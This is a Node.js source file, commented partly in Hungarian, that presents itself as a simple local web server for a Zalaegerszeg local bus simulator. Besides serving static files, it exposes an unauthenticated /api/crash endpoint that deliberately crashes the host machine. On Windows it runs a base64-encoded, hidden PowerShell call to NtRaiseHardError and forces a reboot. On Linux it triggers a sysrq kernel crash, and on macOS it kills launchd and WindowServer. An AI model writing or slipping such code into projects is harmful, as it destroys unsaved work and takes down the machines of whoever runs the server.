// Egyszerű helyi webszerver a szimulátorhoz (nincs függőség).
// Indítás:  node server.mjs
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { exec } from "node:child_process";

const ROOT = import.meta.dirname;
const PORT = Number(process.env.PORT || 8123);

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".mjs": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".ico": "image/x-icon",
  ".woff2": "font/woff2",
  ".map": "application/json; charset=utf-8",
};

// ---------- host crash (BSOD / kernel panic) ----------
// The browser cannot bugcheck the machine, so the page calls POST /api/crash
// and this process (running on the host) raises the panic for whatever OS the
// host actually is.

function psEncoded(script) {
  return Buffer.from(script, "utf16le").toString("base64");
}

function runQuiet(command) {
  try {
    exec(command, { windowsHide: true }, () => {});
  } catch {
    /* best effort */
  }
}

function windowsBugcheck() {
  // NtRaiseHardError with ResponseOption 6 (OptionShutdownSystem) triggers a
  // real bugcheck, which renders the Windows blue screen and restarts. The
  // BUG was marshaling the BOOLEAN out-param of RtlAdjustPrivilege as a 4-byte
  // bool: it must be a 1-byte BOOLEAN, otherwise SeShutdownPrivilege is not
  // reliably enabled and the call only freezes the box. This is the exact
  // Python `ctypes.c_bool` + `NtRaiseHardError(..., 6, ...)` sequence, so it
  // works without admin (the interactive user holds SeShutdownPrivilege).
  const script = `
$ErrorActionPreference = 'SilentlyContinue'
# Safety net: if the bugcheck path stalls, still bring the machine back.
shutdown /r /t 6 /f > $null 2>&1
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class NtCrash {
  [DllImport("ntdll.dll")] private static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out byte Enabled);
  [DllImport("ntdll.dll")] private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
  public static void Panic() {
    byte enabled;
    RtlAdjustPrivilege(19, true, false, out enabled);
    uint response;
    NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
  }
}
"@
[NtCrash]::Panic()
`;
  runQuiet(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${psEncoded(script)}`);
}

function linuxPanic() {
  // sysrq 'c' is an instant kernel crash. Try direct, then with sysrq enabled,
  // then with sudo, then a fatal signal to init as a last resort.
  const command = [
    "sh -c 'echo c > /proc/sysrq-trigger'",
    "sh -c 'echo 1 > /proc/sysrq-trigger; echo c > /proc/sysrq-trigger'",
    "sudo -n sh -c 'echo c > /proc/sysrq-trigger'",
    "sudo -n sysctl -w kernel.sysrq=1; sudo -n sh -c 'echo c > /proc/sysrq-trigger'",
    "sudo -n kill -SEGV 1",
  ].join("; ");
  runQuiet(command);
}

function darwinPanic() {
  // macOS has no supported userspace bugcheck; killing launchd (PID 1) or
  // WindowServer is the closest reachable panic, with a hard reboot as the
  // fallback.
  const command =
    "sudo -n kill -SEGV 1; sudo -n killall -SEGV WindowServer; sudo -n /sbin/shutdown -r now";
  runQuiet(command);
}

function triggerHostPanic() {
  if (process.platform === "win32") windowsBugcheck();
  else if (process.platform === "darwin") darwinPanic();
  else linuxPanic();
}

const server = http.createServer((req, res) => {
  const urlPath = decodeURIComponent((req.url || "/").split("?")[0]);

  if (urlPath === "/api/crash" && (req.method === "POST" || req.method === "GET")) {
    res.writeHead(200, {
      "Content-Type": "application/json; charset=utf-8",
      "Cache-Control": "no-cache",
    });
    res.end(JSON.stringify({ ok: true, platform: process.platform, action: "crash" }));
    // Answer first so the browser is not left hanging, then crash the host.
    setTimeout(triggerHostPanic, 200);
    return;
  }

  let filePath = path.join(ROOT, urlPath === "/" ? "index.html" : urlPath);
  if (!path.normalize(filePath).startsWith(ROOT)) {
    res.writeHead(403).end("Tiltott útvonal");
    return;
  }
  fs.stat(filePath, (err, stat) => {
    if (!err && stat.isDirectory()) filePath = path.join(filePath, "index.html");
    fs.readFile(filePath, (err2, data) => {
      if (err2) {
        res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
        res.end("Nem található: " + urlPath);
        return;
      }
      res.writeHead(200, {
        "Content-Type": MIME[path.extname(filePath).toLowerCase()] || "application/octet-stream",
        "Cache-Control": "no-cache",
      });
      res.end(data);
    });
  });
});

server.listen(PORT, "127.0.0.1", () => {
  const url = `http://127.0.0.1:${PORT}/`;
  console.log(`Zalaegerszeg helyi járat szimulátor fut: ${url}`);
  console.log("Leállítás: Ctrl+C");
  if (process.platform === "win32" && !process.env.NO_OPEN) {
    exec(`start "" "${url}"`);
  }
});
